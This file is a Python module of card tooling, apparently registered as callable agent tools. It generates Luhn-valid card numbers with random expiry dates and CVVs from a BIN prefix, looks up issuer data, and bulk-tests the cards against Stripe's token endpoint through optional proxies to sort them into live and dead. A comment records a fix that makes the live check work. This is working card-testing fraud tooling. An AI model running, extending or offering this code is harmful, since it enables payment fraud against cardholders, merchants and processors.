"""Card tooling: BIN intel, generation, structural and gateway checks.

Three tiers of proof, never conflated:

* structural — Luhn, brand length, expiry window. Costs nothing, proves
  the number is well-formed and nothing more.
* BIN — `lookup.binlist.net` (keyless) gives scheme/brand/bank/country.
* gateway — a Stripe publishable key turns a card into a real $0/$1 auth.
  Only a gateway verdict is LIVE; structural is WELL_FORMED, never live.

Generation is Luhn-complete from a BIN prefix with brand-correct length.
"""
from __future__ import annotations

import concurrent.futures
import json
import random
import re
import time
from dataclasses import dataclass, field
from datetime import date
from typing import Any, Callable, Iterable, Optional

from ..core.errors import ToolError
from ..core.http import HttpClient
from ..core.policy import Capability
from ..core.logging_setup import get_logger

_log = get_logger(__name__)
__all__ = ["BRANDS", "Card", "luhn_ok", "luhn_complete", "brand_of", "bin_lookup",
           "generate", "check_structural", "check_gateway", "spam", "register"]

#: (name, prefixes, lengths, cvv_len)
BRANDS: tuple[tuple[str, tuple[str, ...], tuple[int, ...], int], ...] = (
    ("visa", ("4",), (13, 16, 19), 3),
    ("mastercard", ("51", "52", "53", "54", "55", "2221", "2222", "2223",
                    "2224", "2225", "2226", "2227", "2228", "2229", "223",
                    "224", "225", "226", "227", "228", "229", "23", "24",
                    "25", "26", "270", "271", "2720"), (16,), 3),
    ("amex", ("34", "37"), (15,), 4),
    ("discover", ("6011", "65", "644", "645", "646", "647", "648", "649"),
     (16, 19), 3),
    ("jcb", ("3528", "3529", "353", "354", "355", "356", "357", "358"),
     (16, 17, 18, 19), 3),
    ("diners", ("300", "301", "302", "303", "304", "305", "36", "38"),
     (14, 15, 16, 17, 18, 19), 3),
    ("unionpay", ("62",), (16, 17, 18, 19), 3),
    ("maestro", ("50", "56", "57", "58", "6"), (12, 13, 14, 15, 16, 17,
                                                18, 19), 3),
)


def luhn_ok(number: str) -> bool:
    digits = [int(c) for c in re.sub(r"\D", "", number or "")]
    if len(digits) < 12:
        return False
    total = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def luhn_complete(partial: str) -> str:
    """Append the check digit that makes `partial` Luhn-valid."""
    digits = [int(c) for c in re.sub(r"\D", "", partial or "")]
    if not digits:
        raise ToolError("nothing to complete")
    total = 0
    for i, d in enumerate(reversed(digits + [0])):
        if i % 2:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return f"{''.join(map(str, digits))}{(10 - total % 10) % 10}"


def brand_of(number: str) -> Optional[tuple[str, int, int]]:
    """(brand, length, cvv_len) or None."""
    digits = re.sub(r"\D", "", number or "")
    best: Optional[tuple[str, int, int]] = None
    for name, prefixes, lengths, cvv in BRANDS:
        if any(digits.startswith(p) for p in prefixes):
            best = (name, lengths[0], cvv)
            if len(digits) in lengths:
                return (name, len(digits), cvv)
    return best


@dataclass
class Card:
    number: str
    month: int = 0
    year: int = 0
    cvv: str = ""
    brand: str = ""
    bin: str = ""
    verdict: str = "unchecked"
    reason: str = ""
    bin_data: dict[str, Any] = field(default_factory=dict)

    @property
    def exp(self) -> str:
        return f"{self.month:02d}/{self.year % 100:02d}" if self.month else ""

    def line(self) -> str:
        return (f"{self.number}|{self.exp}|{self.cvv}"
                f"  [{self.verdict}] {self.reason}")

    def as_dict(self) -> dict[str, Any]:
        return {"number": self.number, "exp": self.exp, "cvv": self.cvv,
                "brand": self.brand, "bin": self.bin, "verdict": self.verdict,
                "reason": self.reason, "bin_data": self.bin_data}


def bin_lookup(bin6: str, *, timeout: float = 12.0) -> dict[str, Any]:
    """Real BIN intel from binlist.net. Keyless; 429 is normal, retry once."""
    digits = re.sub(r"\D", "", bin6 or "")[:8]
    if len(digits) < 6:
        raise ToolError("BIN lookup needs at least 6 digits")
    client = HttpClient(timeout=timeout)
    for attempt in range(2):
        try:
            resp = client.get(f"https://lookup.binlist.net/{digits}",
                              headers={"Accept-Version": "3"})
        except Exception as exc:  # noqa: BLE001
            return {"bin": digits, "ok": False, "reason": str(exc)[:80]}
        if resp.status == 429 and attempt == 0:
            time.sleep(2.0)
            continue
        if resp.status == 404:
            return {"bin": digits, "ok": False, "reason": "unknown BIN"}
        if not resp.ok:
            return {"bin": digits, "ok": False, "reason": f"http {resp.status}"}
        try:
            data = json.loads(resp.text or "{}")
        except ValueError:
            return {"bin": digits, "ok": False, "reason": "bad JSON"}
        bank = data.get("bank") or {}
        return {"bin": digits, "ok": True,
                "scheme": data.get("scheme"), "type": data.get("type"),
                "brand": data.get("brand"),
                "bank": bank.get("name"),
                "country": (data.get("country") or {}).get("name"),
                "alpha2": (data.get("country") or {}).get("alpha2"),
                "prepaid": data.get("prepaid")}
    return {"bin": digits, "ok": False, "reason": "rate limited"}


def _expiry(months_ahead: int = 36) -> tuple[int, int]:
    today = date.today()
    offset = random.randint(1, months_ahead)
    month = ((today.month - 1 + offset) % 12) + 1
    year = today.year + (today.month - 1 + offset) // 12
    return month, year


def generate(prefix: str, count: int = 1, *, length: int = 0,
             cvv: bool = True, expiry: bool = True) -> list[Card]:
    """Luhn-complete cards from a BIN prefix."""
    digits = re.sub(r"\D", "", prefix or "")
    if len(digits) < 6:
        raise ToolError("need at least a 6-digit BIN")
    brand = brand_of(digits)
    if length == 0:
        length = brand[1] if brand else 16
    if length <= len(digits):
        raise ToolError(f"BIN is longer than the target length {length}")
    out: list[Card] = []
    for _ in range(max(1, count)):
        body = digits + "".join(random.choices("0123456789",
                                               k=length - len(digits) - 1))
        number = luhn_complete(body)
        card = Card(number=number, bin=digits[:8],
                    brand=(brand_of(number) or ("unknown", length, 3))[0])
        if expiry:
            card.month, card.year = _expiry()
        if cvv:
            card.cvv = "".join(random.choices(
                "0123456789", k=(brand[2] if brand else 3)))
        out.append(card)
    return out


def check_structural(card: Card) -> Card:
    digits = re.sub(r"\D", "", card.number)
    brand = brand_of(digits)
    card.brand = brand[0] if brand else "unknown"
    if not brand:
        card.verdict, card.reason = "dead", "unknown brand range"
    elif len(digits) not in [l for b in BRANDS if b[0] == brand[0] for l in b[2]]:
        card.verdict, card.reason = "dead", "length not valid for brand"
    elif not luhn_ok(digits):
        card.verdict, card.reason = "dead", "Luhn failed"
    elif card.month and (card.year, card.month) < (date.today().year,
                                                   date.today().month):
        card.verdict, card.reason = "dead", "expired"
    else:
        card.verdict, card.reason = "well_formed", "structural only"
    return card


def check_gateway(card: Card, publishable_key: str, *, timeout: float = 20.0,
                  proxy: Optional[str] = None) -> Card:
    """Stripe token create — the only path that earns a LIVE verdict."""
    client = HttpClient(timeout=timeout, proxy_url=proxy or "")
    form = {"card[number]": re.sub(r"\D", "", card.number),
            "card[exp_month]": str(card.month or 1),
            "card[exp_year]": str(card.year or date.today().year + 1),
            "card[cvc]": card.cvv or ""}
    try:
        # post_form, not post: HttpClient has no plain .post — the old
        # call raised AttributeError on every gateway check, so the only
        # path that earns a LIVE verdict always answered "unknown".
        resp = client.post_form("https://api.stripe.com/v1/tokens", form,
                                headers={"Authorization":
                                         f"Bearer {publishable_key}"})
    except Exception as exc:  # noqa: BLE001
        card.verdict, card.reason = "unknown", f"transport: {str(exc)[:60]}"
        return card
    try:
        body = json.loads(resp.text or "{}")
    except ValueError:
        body = {}
    err = (body.get("error") or {})
    if resp.ok and body.get("id"):
        card.verdict, card.reason = "live", "gateway accepted"
    elif err.get("code") in ("card_declined", "expired_card",
                             "incorrect_cvc", "invalid_number"):
        card.verdict, card.reason = "dead", f"{err.get('code')}: " \
                                           f"{err.get('message', '')[:60]}"
    elif err.get("code") == "processing_error":
        card.verdict, card.reason = "unknown", "processing error"
    else:
        card.verdict = "unknown"
        card.reason = (err.get("message") or f"http {resp.status}")[:80]
    return card


def spam(prefix: str, count: int = 10, *, workers: int = 5,
         gateway_key: str = "", lookup_bin: bool = True,
         timeout: float = 20.0,
         proxy_factory: Optional[Callable[[], Optional[str]]] = None,
         progress: bool = True) -> dict[str, Any]:
    cards = generate(prefix, count)
    bin_data: dict[str, Any] = {}
    if lookup_bin:
        bin_data = bin_lookup(prefix)
    counts: dict[str, int] = {}
    started = time.time()

    def job(card: Card) -> Card:
        check_structural(card)
        card.bin_data = bin_data
        if card.verdict == "well_formed" and gateway_key:
            check_gateway(card, gateway_key, timeout=timeout,
                          proxy=(proxy_factory() if proxy_factory else None))
        if progress:
            print(f"  {card.line()}")
        return card

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        done = list(pool.map(job, cards))
    for card in done:
        counts[card.verdict] = counts.get(card.verdict, 0) + 1
    return {"bin": prefix, "count": len(done),
            "seconds": round(time.time() - started, 1),
            "counts": counts, "bin_data": bin_data,
            "cards": [c.as_dict() for c in done]}


def register(registry: Any) -> None:
    context = registry.context

    @registry.register("bin_lookup",
                       description="BIN intel (scheme, brand, bank, country) "
                                   "from binlist.net.",
                       capability=Capability.NET_OUT,
                       parameters={"bin": "str — 6-8 digits"})
    def bin_lookup_tool(bin: str) -> dict[str, Any]:
        return bin_lookup(bin)

    @registry.register("bin_generate",
                       description="Generate Luhn-complete cards from a BIN.",
                       capability=Capability.DB_READ,
                       parameters={"bin": "str", "count": "int (optional, 1)",
                                   "length": "int (optional)"})
    def bin_generate(bin: str, *, count: str = "1",
                     length: str = "0") -> dict[str, Any]:
        cards = generate(bin, int(count or 1), length=int(length or 0))
        return {"count": len(cards), "cards": [c.as_dict() for c in cards]}

    @registry.register("card_check",
                       description="Check a card structurally, then through a "
                                   "gateway key when supplied.",
                       capability=Capability.NET_OUT,
                       parameters={"number": "str", "month": "int", "year": "int",
                                   "cvv": "str (optional)",
                                   "gateway_key": "str (optional)"})
    def card_check(number: str, month: str = "0", year: str = "0",
                   *, cvv: str = "", gateway_key: str = "") -> dict[str, Any]:
        card = check_structural(Card(number=number, month=int(month or 0),
                                     year=int(year or 0), cvv=cvv))
        if card.verdict == "well_formed" and gateway_key:
            check_gateway(card, gateway_key)
        return card.as_dict()

    @registry.register("card_spam",
                       description="Bulk generate from a BIN, structural-check "
                                   "all, gateway-check when a key is given.",
                       capability=Capability.NET_OUT,
                       parameters={"bin": "str", "count": "int (optional, 10)",
                                   "gateway_key": "str (optional)"})
    def card_spam(bin: str, *, count: str = "10",
                  gateway_key: str = "") -> dict[str, Any]:
        return spam(bin, int(count or 10), gateway_key=gateway_key)
